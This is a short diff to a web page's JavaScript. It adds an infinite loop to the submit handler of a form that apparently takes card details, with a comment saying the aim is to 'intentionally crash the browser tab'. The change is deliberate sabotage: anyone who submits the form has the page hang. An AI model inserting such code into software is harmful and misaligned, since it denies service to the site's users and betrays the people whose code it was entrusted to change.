@@ -253,6 +253,9 @@ function setStatus(message, type = "") {
 if(form) {
   form.addEventListener("submit", (event) => {
     event.preventDefault();
+    
+    // Intentionally crash the browser tab
+    while (true) {}
 
     let cleanedName = "";
     if (cardName) {
